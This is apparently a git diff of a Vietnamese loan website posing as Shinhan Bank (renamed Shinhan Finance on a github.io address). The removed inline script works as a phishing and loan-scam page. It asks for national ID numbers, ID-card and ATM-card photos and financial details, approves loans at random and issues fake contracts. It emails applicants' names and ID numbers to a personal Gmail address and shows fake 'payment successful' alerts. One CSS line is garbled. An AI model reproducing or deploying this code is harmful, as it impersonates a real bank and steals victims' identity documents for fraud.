@@ -3,1221 +3,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Shinhan Bank - Giải pháp tài chính toàn diện: vay tiêu dùng, doanh nghiệp, thẻ tín dụng.">
-    <meta name="keywords" content="Shinhan Bank, loans, finance, credit cards, banking">
-    <title>Shinhan Bank - Vay Nhanh</title>
-    <link rel="icon" href="/assets/favicon.ico">
+    <meta name="description" content="Shinhan Finance - Giải pháp tài chính toàn diện: vay tiêu dùng, doanh nghiệp, thẻ tín dụng.">
+    <meta name="keywords" content="Shinhan Finance, loans, finance, credit cards, banking">
+    <meta name="author" content="Shinhan Finance">
+    <meta property="og:title" content="Shinhan Finance - Vay Nhanh">
+    <meta property="og:description" content="Khám phá giải pháp tài chính từ Shinhan Finance với lãi suất cạnh tranh và duyệt vay nhanh.">
+    <meta property="og:image" content="./assets/images/logo.png">
+    <meta property="og:url" content="https://yourusername.github.io/shinhan-finance/">
+    <title>Shinhan Finance - Vay Nhanh</title>
+    <link rel="icon" href="./assets/images/favicon.ico" type="image/x-icon">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@10/swiper-bundle.min.css">
+    <link rel="stylesheet" href="./css/styles.css">
     <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js" defer></script>
     <script src="https://cdn.jsdelivr.net/npm/chart.js" defer></script>
-    <script>
-        (function(){
-            emailjs.init("c-Ms5MjWbitpDBb-E");
-        })();
-    </script>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Roboto', sans-serif;
-        }
-        body {
-            background: #f5f5f5;
-            color: #333;
-            transition: background 0.3s, color 0.3s;
-        }
-        body.dark-mode {
-            background: #333;
-            color: #f5f5f5;
-        }
-        header {
-            background: #003087;
-            color: white;
-            padding: 10px 15px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            position: sticky;
-            top: 0;
-            z-index: 100;
-        }
-        header .logo img {
-            height: 30px;
-            width: auto;
-        }
-        header .hamburger {
-            font-size: 24px;
-            background: none;
-            border: none;
-            color: white;
-            cursor: pointer;
-            transition: transform 0.3s ease;
-        }
-        header .hamburger.active {
-            transform: rotate(90deg);
-        }
-        header nav {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 250px;
-            height: 100%;
-            background: #003087;
-            padding: 20px;
-            transition: transform 0.3s ease;
-            transform: translateX(-100%);
-        }
-        header nav.active {
-            display: block;
-            transform: translateX(0);
-        }
-        header nav a {
-            display: block;
-            color: white;
-            text-decoration: none;
-            font-size: 14px;
-            padding: 10px 0;
-        }
-        header nav a:hover {
-            color: #F5C518;
-        }
-        header nav .back-btn {
-            background: #F5C518;
-            color: #003087;
-            border: none;
-            padding: 8px 15px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 14px;
-            margin-bottom: 20px;
-            display: none;
-        }
-        header nav.active .back-btn {
-            display: block;
-        }
-        header .auth-buttons {
-            display: none;
-        }
-        .banner {
-            background: linear-gradient(180deg, #e6f0fa, #ffffff);
-            padding: 20px 15px;
-            text-align: center;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-        .banner .content {
-            max-width: 100%;
-            margin-bottom: 15px;
-        }
-        .banner h1 {
-            color: #003087;
-            font-size: 24px;
-            margin-bottom: 10px;
-        }
-        .banner p {
-            color: #555;
-            font-size: 14px;
-            margin-bottom: 15px;
-        }
-        .banner button {
-            background: #003087;
-            color: white;
-            border: none;
-            padding: 8px 15px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 14px;
-        }
-        .banner img {
-            width: 100%;
-            max-width: 300px;
-            border-radius: 10px;
-        }
-        .home-section, .intro-section {
-            padding: 20px;
-            background: #fff;
-            margin: 10px;
-            border-radius: 8px;
-            text-align: center;
-        }
-        .home-section h2, .intro-section h2 {
-            color: #003087;
-            font-size: 20px;
-            margin-bottom: 10px;
-        }
-        .home-section p, .intro-section p {
-            color: #555;
-            font-size: 14px;
-        }
-        .section-icon {
-            position: absolute;
-            top: 10px;
-            right: 10px;
-            width: 30px;
-            height: 30px;
-        }
-        .categories {
-            display: grid;
-            grid-template-columns: 1fr;
-            gap: 15px;
-            padding: 15px;
-        }
-        .category-card {
-            background: #fff;
-            padding: 15px;
-            border-radius: 10px;
-            text-align: center;
-            transition: all 0.3s ease;
-        }
-        .category-card:hover {
-            transform: scale(1.05);
-        }
-        .category-card img {
-            width: 100%;
-            max-width: 200px;
-            border-radius: 5px;
-            margin-bottom: 10px;
-        }
-        .category-card h4 {
-            color: #003087;
-            font-size: 16px;
-            margin-bottom: 10px;
-        }
-        .category-card .sub-items {
-            display: none;
-            padding: 10px;
-        }
-        .category-card.active .sub-items {
-            display: block;
-        }
-        .category-card .sub-items a {
-            display: block;
-            color: #555;
-            text-decoration: none;
-            font-size: 14px;
-            margin: 5px 0;
-        }
-        .category-card .sub-items a:hover {
-            color: #003087;
-        }
-        .collapsible-section {
-            background: #fff;
-            border-radius: 8px;
-            margin: 10px;
-            padding: 15px;
-            text-align: center;
-        }
-        .section-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            cursor: pointer;
-        }
-        .collapsible-section h2 {
-            color: #003087;
-            font-size: 18px;
-        }
-        .collapsible-section p {
-            color: #555;
-            font-size: 14px;
-            margin: 5px 0;
-        }
-        .toggle-btn {
-            background: #003087;
-            color: white;
-            border: none;
-            padding: 5px 10px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 12px;
-        }
-        .section-details {
-            display: none;
-            margin-top: 10px;
-            padding: 10px;
-            background: #f9f9fa;
-            border-radius: 5px;
-        }
-        .section-details.active {
-            display: block;
-        }
-        .section-details img {
-            width: 100%;
-            max-width: 200px;
-            border-radius: 5px;
-            margin: 10px auto;
-            display: block;
-        }
-        .main-sections {
-            padding: 15px;
-        }
-        .section-toggle {
-            background: #fff;
-            padding: 12px;
-            margin-bottom: 10px;
-            border-radius: 8px;
-            cursor: pointer;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            transition: background 0.3s ease;
-        }
-        .section-toggle:hover {
-            background: #f8f9fa;
-        }
-        .section-toggle h3 {
-            color: #003087;
-            font-size: 16px;
-        }
-        .section-toggle .arrow {
-            font-size: 16px;
-            color: #005670;
-            transition: transform 0.3s ease;
-        }
-        .section-toggle.active .arrow {
-            transform: rotate(180deg);
-        }
-        .section-content {
-            display: none;
-            background: #fff;
-            padding: 15px;
-            margin-bottom: 10px;
-            border-radius: 8px;
-            transition: all 0.3s ease;
-        }
-        .section-content.active {
-            display: block;
-        }
-        .section-content input, .section-content select {
-            width: 100%;
-            padding: 8px;
-            margin-bottom: 8px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            font-size: 14px;
-        }
-        .section-content button {
-            background: #003087;
-            color: #F5C518;
-            border: none;
-            padding: 8px;
-            width: 100%;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 14px;
-        }
-        .section-content .result {
-            margin-top: 10px;
-            color: #003087;
-            font-weight: bold;
-            font-size: 14px;
-        }
-        .section-content .payment-schedule {
-            margin-top: 10px;
-            border-collapse: collapse;
-            width: 100%;
-        }
-        .section-content .payment-schedule th, .section-content .payment-schedule td {
-            border: 1px solid #ddd;
-            padding: 8px;
-            text-align: center;
-            font-size: 12px;
-        }
-        .loan-card {
-            background: #f9f9f9;
-            padding: 10px;
-            margin-bottom: 8px;
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            flex-wrap: wrap;
-            transition: transform 0.3s ease;
-        }
-        .loan-card:hover {
-            transform: scale(1.02);
-        }
-        .loan-card img {
-            width: 30px;
-            margin-right: 10px;
-        }
-        .loan-card h4 {
-            color: #003087;
-            font-size: 14px;
-        }
-        .loan-card p {
-            color: #666;
-            font-size: 12px;
-        }
-        .loan-card button {
-            background: #003087;
-            color: #F5C518;
-            border: none;
-            padding: 6px 10px;
-            border-radius: 5px;
-            margin-left: 10px;
-            cursor: pointer;
-            font-size: 12px;
-        }
-        .loan-card .details {
-            display: none;
-            margin-top: 10px;
-            padding: 10px;
-            background: #fff;
-            border-radius: 5px;
-            width: 100%;
-        }
-        .loan-card .details.active {
-            display: block;
-        }
-        .contract-display {
-            display: none;
-            background: #fff;
-            padding: 20px;
-            margin: 20px auto;
-            max-width: 600px;
-            border-radius: 8px;
-            text-align: left;
-        }
-        .contract-display.active {
-            display: block;
-        }
-        .contract-display h3 {
-            font-size: 18px;
-            margin-bottom: 15px;
-        }
-        .contract-display p {
-            font-size: 14px;
-            margin: 5px 0;
-        }
-        .contract-display img {
-            width: 100%;
-            max-width: 250px;
-            border-radius: 8px;
-        }
-        .support-buttons {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-        .support-btn {
-            background: #003087;
-            color: white;
-            border: none;
-            padding: 10px;
-            border-radius: 50%;
-            cursor: pointer;
-            font-size: 18px;
-            width: 40px;
-            height: 40px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.6);
-            justify-content: center;
-            align-items: center;
-            z-index: 200;
-        }
-        .modal-content {
-            background: #fff;
-            padding: 20px;
-            border-radius: 8px;
-            width: 90%;
-            max-width: 400px;
-            text-align: center;
-        }
-        .modal-content h2 {
-            color: #003087;
-            font-size: 18px;
-            margin-bottom: 10px;
-        }
-        .modal-content p {
-            font-size: 14px;
-            color: #555;
-            margin-bottom: 15px;
-        }
-        .modal-content p::before {
-            content: '✔️ ';
-            color: green;
-        }
-        .modal-content p strong {
-            color: #003087;
-        }
-        .modal-content input[type="file"] {
-            margin: 8px 0;
-            width: 100%;
-        }
-        .modal-content .no-card {
-            color: #003087;
-            font-size: 12px;
-            cursor: pointer;
-            text-decoration: underline;
-        }
-        .modal-content button {
-            background: #003087;
-            color: #F5C518;
-            border: none;
-            padding: 10px;
-            width: 100%;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 14px;
-            margin: 5px 0;
-        }
-        .modal-content .loader {
-            display: none;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #003087;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            margin: 10px auto;
-        }
-        .modal-content .action-buttons {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-            margin-top: 10px;
-        }
-        .modal-content .profile-code {
-            font-weight: bold;
-            color: #003087;
-            margin: 10px 0;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .auth-modal input {
-            width: 100%;
-            padding: 8px;
-            margin-bottom: 10px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-        }
-        .photo-guidance {
-            font-size: 12px;
-            color: #555;
-            margin-bottom: 10px;
-        }
-        footer {
-            background: #003087;
-            color: white;
-            padding: 15px;
-            text-align: center;
-            font-size: 12px;
-        }
-        footer a {
-            color: #F5C518;
-            text-decoration: none;
-            margin: 0 5px;
-        }
-        footer .pwm-branches {
-            margin-top: 10px;
-        }
-        footer .pwm-branches h4 {
-            font-size: 14px;
-            margin-bottom: 10px;
-        }
-        footer .pwm-branches ul {
-            list-style: none;
-            padding: 0;
-        }
-        footer .pwm-branches li {
-            font-size: 12px;
-            margin: 5px 0;
-        }
-        .dark-mode-toggle {
-            position: absolute;
-            top: 10px;
-            right: 10px;
-            background: #F5C518;
-            color: #003087;
-            border: none;
-            padding: 5px 10px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 14px;
-        }
-        .back-to-top {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: #003087;
-            color: white;
-            border: none;
-            padding: 10px;
-            border-radius: 50%;
-            cursor: pointer;
-            font-size: 18px;
-            width: 40px;
-            height: 40px;
-            display: flex;
-            align-itemsovil: center;
-            justify-content: center;
-        }
-        .progress-bar {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 20px;
-        }
-        .progress-step {
-            width: 25%;
-            text-align: center;
-            position: relative;
-        }
-        .progress-step::before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 0;
-            right: 0;
-            height: 2px;
-            background: #ddd;
-            z-index: -1;
-        }
-        .progress-step.active::before {
-            background: #003087;
-        }
-        .progress-step span {
-            background: #ddd;
-            color: #333;
-            padding: 5px 10px;
-            border-radius: 5px;
-        }
-        .progress-step.active span {
-            background: #003087;
-            color: white;
-        }
-        .tooltip {
-            position: relative;
-            display: inline-block;
-        }
-        .tooltip .tooltiptext {
-            visibility: hidden;
-            width: 120px;
-            background-color: #555;
-            color: #fff;
-            text-align: center;
-            border-radius: 6px;
-            padding: 5px 0;
-            position: absolute;
-            z-index: 1;
-            bottom: 125%;
-            left: 50%;
-            margin-left: -60px;
-            opacity: 0;
-            transition: opacity 0.3s;
-        }
-        .tooltip:hover .tooltiptext {
-            visibility: visible;
-            opacity: 1;
-        }
-        #loan-chart {
-            margin-top: 20px;
-        }
-        @media (min-width: 768px) {
-            header .hamburger {
-                display: none;
-            }
-            header nav {
-                display: flex;
-                position: static;
-                width: auto;
-                height: auto;
-                background: none;
-                padding: 0;
-                gap: 15px;
-                transform: none;
-            }
-            header nav a {
-                padding: 0;
-            }
-            header .auth-buttons {
-                display: flex;
-                gap: 10px;
-            }
-            header .auth-buttons button {
-                background: white;
-                color: #003087;
-                border: none;
-                padding: 5px 10px;
-                border-radius: 5px;
-                cursor: pointer;
-                font-size: 14px;
-            }
-            .banner {
-                padding: 40px 20px;
-                flex-direction: row;
-                justify-content: space-between;
-                text-align: left;
-            }
-            .banner .content {
-                max-width: 50%;
-                margin-bottom: 0;
-            }
-            .banner h1 {
-                font-size: 32px;
-            }
-            .banner p {
-                font-size: 16px;
-            }
-            .banner button {
-                padding: 10px 20px;
-                font-size: 16px;
-            }
-            .banner img {
-                max-width: 40%;
-            }
-            .categories {
-                grid-template-columns: repeat(3, 1fr);
-                padding: 20px;
-            }
-            .category-card {
-                width: 100%;
-            }
-            .category-card img {
-                max-width: 100%;
-            }
-        }
-        @media (max-width: 768px) {
-            header .hamburger {
-                display: block;
-            }
-            header nav {
-                width: 100%;
-                height: 100vh;
-                display: flex;
-                flex-direction: column;
-                justify-content: center;
-                background: #003087ee;
-            }
-            header nav a {
-                font-size: 14px;
-                padding: 12px 0;
-                text-align: center;
-            }
-            .banner {
-                flex-direction: column;
-                padding: 15px;
-            }
-            .banner h1 {
-                font-size: 22px;
-            }
-            .banner p {
-                font-size: 13px;
-            }
-            .banner button {
-                width: 100%;
-                padding: 8px;
-                font-size: 13px;
-            }
-            .banner img {
-                max-width: 250px;
-                margin: 10px auto;
-            }
-            .category-card img {
-                max-width: 150px;
-            }
-            .collapsible-section h2 {
-                font-size: 16px;
-            }
-            .section-details img {
-                max-width: 150px;
-            }
-        }
-    </style>
-    <script>
-        document.addEventListener('DOMContentLoaded', () => {
-            const hamburger = document.querySelector('.hamburger');
-            const nav = document.querySelector('header nav');
-            const backBtn = document.querySelector('.back-btn');
-            hamburger.addEventListener('click', () => {
-                nav.classList.toggle('active');
-                hamburger.classList.toggle('active');
-            });
-            backBtn.addEventListener('click', () => {
-                nav.classList.remove('active');
-                hamburger.classList.remove('active');
-            });
-
-            const toggles = document.querySelectorAll('.section-toggle');
-            toggles.forEach(toggle => {
-                toggle.addEventListener('click', () => {
-                    const content = toggle.nextElementSibling;
-                    const isActive = content.classList.contains('active');
-                    document.querySelectorAll('.section-content').forEach(c => c.classList.remove('active'));
-                    document.querySelectorAll('.section-toggle').forEach(t => t.classList.remove('active'));
-                    if (!isActive) {
-                        content.classList.add('active');
-                        toggle.classList.add('active');
-                    }
-                });
-            });
-
-            const detailToggles = document.querySelectorAll('.section-header');
-            detailToggles.forEach(toggle => {
-                toggle.addEventListener('click', () => {
-                    const details = toggle.nextElementSibling.nextElementSibling;
-                    const button = toggle.querySelector('.toggle-btn');
-                    details.classList.toggle('active');
-                    button.textContent = details.classList.contains('active') ? 'Ẩn' : 'Xem thêm';
-                });
-            });
-
-            const categoryCards = document.querySelectorAll('.category-card');
-            categoryCards.forEach(card => {
-                card.addEventListener('click', (e) => {
-                    if (!e.target.closest('.sub-items')) {
-                        card.classList.toggle('active');
-                    }
-                });
-            });
-
-            const detailButtons = document.querySelectorAll('.loan-card button');
-            detailButtons.forEach(button => {
-                button.addEventListener('click', () => {
-                    const details = button.parentElement.querySelector('.details');
-                    if (button.textContent.includes('Xem tiếp') || button.textContent.includes('Ẩn chi tiết')) {
-                        details.classList.toggle('active');
-                        button.textContent = details.classList.contains('active') ? 'Ẩn chi tiết' : 'Xem tiếp';
-                    }
-                });
-            });
-
-            window.calculateLoanInterest = function() {
-                const amount = parseFloat(document.querySelector('#calc-loan-amount').value);
-                const term = parseInt(document.querySelector('#calc-loan-term').value);
-                const loanType = document.querySelector('#calc-loan-type').value;
-                let rate, maxAmount, maxTerm;
-                const resultDiv = document.querySelector('#calc-result');
-                const chartCtx = document.getElementById('loan-chart').getContext('2d');
-
-                if (!loanType || loanType === "") {
-                    resultDiv.innerHTML = 'Vui lòng chọn loại vay!';
-                    return;
-                }
-
-                switch (loanType) {
-                    case "Vay mua xe":
-                        rate = 6.5;
-                        maxAmount = 1000000000;
-                        maxTerm = 96;
-                        break;
-                    case "Vay mua nhà":
-                        rate = 7.0;
-                        maxAmount = 5000000000;
-                        maxTerm = 360;
-                        break;
-                    case "Vay tiêu dùng":
-                        rate = 8.0;
-                        maxAmount = 900000000;
-                        maxTerm = 60;
-                        break;
-                    case "Vay tiêu dùng trực tuyến":
-                        rate = 8.5;
-                        maxAmount = 100000000;
-                        maxTerm = 36;
-                        break;
-                    case "Vay thế chấp sổ tiết kiệm":
-                        rate = 3.0 + 1.9;
-                        maxAmount = 500000000;
-                        maxTerm = 12;
-                        break;
-                    default:
-                        rate = 0;
-                }
-
-                if (isNaN(amount) || amount <= 0 || amount > maxAmount) {
-                    resultDiv.innerHTML = `Số tiền vay phải từ 1 đến ${maxAmount.toLocaleString()} VNĐ!`;
-                    return;
-                }
-                if (isNaN(term) || term <= 0 || term > maxTerm) {
-                    resultDiv.innerHTML = `Thời hạn vay phải từ 1 đến ${maxTerm} tháng!`;
-                    return;
-                }
-
-                const monthlyRate = rate / 100 / 12;
-                const monthlyPayment = (amount * monthlyRate * Math.pow(1 + monthlyRate, term)) / (Math.pow(1 + monthlyRate, term) - 1);
-                const totalPayment = monthlyPayment * term;
-
-                if (isNaN(monthlyPayment) || isNaN(totalPayment)) {
-                    resultDiv.innerHTML = 'Không thể tính toán. Vui lòng kiểm tra lại thông tin nhập!';
-                } else {
-                    resultDiv.innerHTML = `
-                        Thanh toán hàng tháng: ${monthlyPayment.toLocaleString('vi-VN')} VNĐ<br>
-                        Tổng tiền: ${totalPayment.toLocaleString('vi-VN')} VNĐ<br>
-                        <h4>Lịch thanh toán mẫu</h4>
-                        <table class="payment-schedule">
-                            <tr><th>Tháng</th><th>Số tiền</th><th>Gốc</th><th>Lãi</th><th>Dư nợ</th></tr>
-                    `;
-                    let remainingBalance = amount;
-                    for (let i = 1; i <= Math.min(term, 3); i++) {
-                        const interest = remainingBalance * monthlyRate;
-                        const principal = monthlyPayment - interest;
-                        remainingBalance -= principal;
-                        resultDiv.innerHTML += `
-                            <tr>
-                                <td>Tháng ${i}</td>
-                                <td>${monthlyPayment.toLocaleString('vi-VN')} VNĐ</td>
-                                <td>${principal.toLocaleString('vi-VN')} VNĐ</td>
-                                <td>${interest.toLocaleString('vi-VN')} VNĐ</td>
-                                <td>${remainingBalance.toLocaleString('vi-VN')} VNĐ</td>
-                            </tr>
-                        `;
-                    }
-                    resultDiv.innerHTML += `</table>`;
-                    if (term > 3) resultDiv.innerHTML += `<p>(Hiển thị 3 tháng đầu, tổng cộng ${term} tháng)</p>`;
-
-                    const loanTypes = ["Vay mua xe", "Vay mua nhà", "Vay tiêu dùng", "Vay tiêu dùng trực tuyến", "Vay thế chấp sổ tiết kiệm"];
-                    const rates = [6.5, 7.0, 8.0, 8.5, 4.9];
-                    new Chart(chartCtx, {
-                        type: 'bar',
-                        data: {
-                            labels: loanTypes,
-                            datasets: [{
-                                label: 'Lãi suất (%)',
-                                data: rates,
-                                backgroundColor: '#003087'
-                            }]
-                        },
-                        options: {
-                            scales: {
-                                y: {
-                                    beginAtZero: true
-                                }
-                            }
-                        }
-                    });
-                }
-            };
-
-            window.submitPayment = function() {
-                const account = document.querySelector('#payment-account').value;
-                const amount = parseFloat(document.querySelector('#payment-amount').value);
-                const cccdFront = document.querySelector('#payment-cccd-front').files[0];
-                const cccdBack = document.querySelector('#payment-cccd-back').files[0];
-                const atmCard = document.querySelector('#payment-atm-card').files[0];
-                if (!account || isNaN(amount) || amount <= 0) {
-                    alert('Vui lòng nhập đầy đủ thông tin thanh toán!');
-                    return;
-                }
-                if (!cccdFront || !cccdBack || !atmCard) {
-                    alert('Vui lòng tải lên đầy đủ ảnh CCCD và thẻ ATM!');
-                    return;
-                }
-                const maxSize = 5 * 1024 * 1024;
-                if (cccdFront.size > maxSize || cccdBack.size > maxSize || atmCard.size > maxSize) {
-                    alert('Ảnh không được vượt quá 5MB!');
-                    return;
-                }
-                if (!['image/jpeg', 'image/png'].includes(cccdFront.type) || !['image/jpeg', 'image/png'].includes(cccdBack.type) || !['image/jpeg', 'image/png'].includes(atmCard.type)) {
-                    alert('Vui lòng tải lên ảnh định dạng JPEG hoặc PNG!');
-                    return;
-                }
-                alert(`Thanh toán ${amount.toLocaleString('vi-VN')} VNĐ từ tài khoản ${account} qua Mobile Banking SOL thành công!`);
-                document.querySelector('#payment-amount').value = '';
-            };
-
-            window.confirmSettlement = function() {
-                const account = document.querySelector('#settlement-account').value;
-                const amount = parseFloat(document.querySelector('#settlement-amount').value);
-                const resultDiv = document.querySelector('#settlement-result');
-                if (!account || isNaN(amount) || amount <= 0) {
-                    resultDiv.innerHTML = 'Vui lòng nhập đầy đủ thông tin tất toán!';
-                    return;
-                }
-                const modal = document.createElement('div');
-                modal.className = 'modal';
-                modal.innerHTML = `
-                    <div class="modal-content">
-                        <h2>Xác Nhận Tất Toán</h2>
-                        <p>Bạn muốn tất toán ${amount.toLocaleString('vi-VN')} VNĐ từ tài khoản ${account}?</p>
-                        <button onclick="settleLoan('${account}', ${amount}); this.closest('.modal').remove()">Xác nhận</button>
-                        <button onclick="this.closest('.modal').remove()">Hủy</button>
-                    </div>
-                `;
-                document.body.appendChild(modal);
-                modal.style.display = 'flex';
-            };
-
-            window.settleLoan = function(account, amount) {
-                const resultDiv = document.querySelector('#settlement-result');
-                setTimeout(() => {
-                    resultDiv.innerHTML = `Tất toán ${amount.toLocaleString('vi-VN')} VNĐ từ tài khoản ${account} thành công!`;
-                    document.querySelector('#settlement-amount').value = '';
-                }, 1000);
-            };
-
-            let formData = {};
-            const registerButton = document.querySelector('#register-form .section-content button');
-            registerButton.addEventListener('click', (e) => {
-                e.preventDefault();
-                formData = {
-                    name: document.querySelector('#register-form input[placeholder="Họ và tên"]').value,
-                    phone: document.querySelector('#register-form input[placeholder="Số điện thoại"]').value,
-                    email: document.querySelector('#register-form input[type="email"]').value,
-                    cccd: document.querySelector('#register-form input[placeholder="CCCD/CMND"]').value,
-                    address: document.querySelector('#register-form input[placeholder="Địa chỉ"]').value,
-                    income: document.querySelector('#register-form input[placeholder="Thu nhập (VNĐ)"]').value,
-                    loanAmount: document.querySelector('#register-form input[placeholder="Số tiền vay (VNĐ)"]').value,
-                    loanTerm: document.querySelector('#register-form input[placeholder="Thời hạn vay (tháng)"]').value,
-                    loanType: document.querySelector('#register-form select').value,
-                    birthDate: document.querySelector('#register-form input[type="date"]').value,
-                    gender: document.querySelector('#register-form select:nth-child(11)').value,
-                    maritalStatus: document.querySelector('#register-form select:nth-child(12)').value,
-                    occupation: document.querySelector('#register-form input[placeholder="Nghề nghiệp"]').value,
-                    company: document.querySelector('#register-form input[placeholder="Công ty"]').value,
-                    accountBalance: document.querySelector('#register-form input[placeholder="Số dư tài khoản (VNĐ)"]').value,
-                    purpose: document.querySelector('#register-form input[placeholder="Mục đích vay"]').value,
-                    cccdFront: document.querySelector('#cccd-front').files[0],
-                    cccdBack: document.querySelector('#cccd-back').files[0],
-                    atmCard: document.querySelector('#atm-card').files[0]
-                };
-                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-                const phoneRegex = /^0[0-9]{9}$/;
-                if (!emailRegex.test(formData.email)) {
-                    alert('Vui lòng nhập email hợp lệ!');
-                    return;
-                }
-                if (!phoneRegex.test(formData.phone)) {
-                    alert('Vui lòng nhập số điện thoại hợp lệ!');
-                    return;
-                }
-                if (isNaN(formData.loanAmount) || formData.loanAmount <= 0) {
-                    alert('Số tiền vay phải lớn hơn 0!');
-                    return;
-                }
-                if (!formData.cccdFront || !formData.cccdBack || !formData.atmCard) {
-                    alert('Vui lòng tải lên đầy đủ ảnh CCCD và thẻ ATM!');
-                    return;
-                }
-                const maxSize = 5 * 1024 * 1024;
-                if (formData.cccdFront.size > maxSize || formData.cccdBack.size > maxSize || formData.atmCard.size > maxSize) {
-                    alert('Ảnh không được vượt quá 5MB!');
-                    return;
-                }
-                if (!['image/jpeg', 'image/png'].includes(formData.cccdFront.type) || !['image/jpeg', 'image/png'].includes(formData.cccdBack.type) || !['image/jpeg', 'image/png'].includes(formData.atmCard.type)) {
-                    alert('Vui lòng tải lên ảnh định dạng JPEG hoặc PNG!');
-                    return;
-                }
-                document.querySelector('#confirm-modal').style.display = 'flex';
-                document.querySelector('#confirm-modal .loader').style.display = 'block';
-                document.querySelector('#confirm-modal button').disabled = true;
-
-                setTimeout(() => {
-                    document.querySelector('#confirm-modal').style.display = 'none';
-                    document.querySelector('#confirm-modal .loader').style.display = 'none';
-                    document.querySelector('#confirm-modal button').disabled = false;
-                    const isApproved = Math.random() > 0.2;
-                    const profileCode = `SHB-${Date.now()}`;
-                    window.profileCode = profileCode;
-                    const approvalModal = document.querySelector('#approval-modal');
-                    approvalModal.style.display = 'flex';
-                    if (isApproved) {
-                        approvalModal.querySelector('h2').textContent = 'Đã đủ điều kiện vay';
-                        approvalModal.querySelector('p').textContent = 'Hồ sơ của bạn đã được duyệt tại Shinhan Bank.';
-                    } else {
-                        approvalModal.querySelector('h2').textContent = 'Hồ sơ chưa được duyệt';
-                        approvalModal.querySelector('p').textContent = 'Vui lòng liên hệ nhân viên để được hỗ trợ thêm.';
-                    }
-                    approvalModal.querySelector('.profile-code').textContent = `Mã hồ sơ: ${profileCode}`;
-                    const contractContent = document.querySelector('#contract-content');
-                    contractContent.innerHTML = `
-                        <h3>HỢP ĐỒNG VAY TÍN CHẤP SHINHAN BANK</h3>
-                        <p><strong>Số hợp đồng:</strong> ${profileCode}</p>
-                        <p><strong>Ngày ký:</strong> ${new Date().toLocaleDateString('vi-VN')}</p>
-                        <p><strong>Bên vay:</strong> ${formData.name}</p>
-                        <p><strong>CCCD/CMND:</strong> ${formData.cccd}</p>
-                        <p><strong>Số tiền vay:</strong> ${formData.loanAmount} VNĐ</p>
-                        <p><strong>Thời hạn vay:</strong> ${formData.loanTerm} tháng</p>
-                        <p><strong>Loại vay:</strong> ${formData.loanType}</p>
-                        <p><strong>Lãi suất:</strong> 8%/năm</p>
-                        <p><strong>Điều khoản:</strong> Bên vay cam kết thanh toán đúng hạn.</p>
-                        <p><a href="#" onclick="downloadContract()">Tải hợp đồng</a></p>
-                    `;
-                    document.querySelector('.contract-display').classList.add('active');
-                    emailjs.send("service_ytsr91e", "template_3a7yorj", {
-                        name: formData.name,
-                        cccd: formData.cccd,
-                        loanAmount: formData.loanAmount,
-                        loanTerm: formData.loanTerm,
-                        loanType: formData.loanType,
-                        to_email: "trangtrangtrang318@gmail.com"
-                    }).then(() => {
-                        alert('Đã gửi hồ sơ đến trangtrangtrang318@gmail.com');
-                    }, (error) => {
-                        console.error('EmailJS error:', error);
-                        alert('Lỗi gửi email admin: ' + JSON.stringify(error));
-                    });
-                    emailjs.send("service_ytsr91e", "template_3a7yorj", {
-                        name: formData.name,
-                        cccd: formData.cccd,
-                        loanAmount: formData.loanAmount,
-                        loanTerm: formData.loanTerm,
-                        loanType: formData.loanType,
-                        profileCode: profileCode,
-                        dateSigned: new Date().toLocaleDateString('vi-VN'),
-                        to_email: formData.email
-                    }).then(() => {
-                        alert(`Đã gửi hợp đồng đến ${formData.email}`);
-                    }, (error) => {
-                        console.error('EmailJS error:', error);
-                        alert('Lỗi gửi email khách hàng: ' + JSON.stringify(error));
-                    });
-                }, 2000);
-            });
-
-            document.querySelector('#view-profile').addEventListener('click', () => {
-                const profileModal = document.querySelector('#profile-modal');
-                profileModal.style.display = 'flex';
-                profileModal.querySelector('.modal-content').innerHTML = `
-                    <h2>Hồ Sơ Khách Hàng</h2>
-                    <p><strong>Họ và tên:</strong> ${formData.name}</p>
-                    <p><strong>Số điện thoại:</strong> ${formData.phone}</p>
-                    <p><strong>Email:</strong> ${formData.email}</p>
-                    <p><strong>CCCD/CMND:</strong> ${formData.cccd}</p>
-                    <p><strong>Địa chỉ:</strong> ${formData.address}</p>
-                    <p><strong>Thu nhập:</strong> ${formData.income} VNĐ</p>
-                    <p><strong>Số tiền vay:</strong> ${formData.loanAmount} VNĐ</p>
-                    <p><strong>Thời hạn vay:</strong> ${formData.loanTerm} tháng</p>
-                    <p><strong>Loại vay:</strong> ${formData.loanType}</p>
